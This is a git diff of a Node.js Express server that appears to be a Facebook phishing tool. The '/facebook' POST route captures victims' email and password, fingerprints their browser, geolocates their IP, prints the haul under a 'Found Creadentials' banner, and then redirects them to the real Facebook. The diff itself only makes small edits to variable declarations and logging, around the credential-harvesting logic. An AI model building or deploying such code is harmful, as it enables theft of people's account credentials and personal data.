@@ -15,16 +15,13 @@ app.get("/", (req, res) => {
 });
 
 app.post("/facebook", (req, res) => {
-  const email = req.body.email;
-  const password = req.body.password;
+  let email = req.body.email;
+  let password = req.body.password;
   const userAgent = req.headers["user-agent"];
   const startSniff = new Sniffr();
-
   startSniff.sniff(userAgent);
-
-  const clientIp = requestIp.getClientIp(req);
-  const geo = geoip.lookup(clientIp); // will be set to null if server is accessed locally
-
+  let clientIp = requestIp.getClientIp(req);
+  let geo = geoip.lookup(clientIp); // will be set to null if server is accessed locally
   res.statusCode = 200;
   res.setHeader("Content-Type", "application/json");
 
@@ -44,21 +41,9 @@ app.post("/facebook", (req, res) => {
     var parseData = JSON.parse(data);
 
     console.log(
-      `
-       """"""""""""""""""""""""""" Found Creadentials """"""""""""""""""""""""""""""""" 
-      `,
-      JSON.stringify(
-        {
-          email,
-          password,
-          ...startSniff,
-          clientIp,
-          geo
-        },
-        null,
-        2
-      )
+      `  """"""""""""""""""""""""""" Found Creadentials """"""""""""""""""""""""""""""""" `
     );
+    console.table(data);
 
     console.table(parseData);
 
@@ -72,15 +57,13 @@ app.post("/facebook", (req, res) => {
 
     return res.redirect("http://www.facebook.com");
   } catch (err) {
-
-    console.log(err)
+    console.log(err);
   }
   throw err;
 });
 
 app.listen(PORT, HOST, err => {
   if (err) throw err;
-
   console.log(`
 
    _ __   ___   __| | ___ _ __ | |__ (_)___| |__   ___ _ __
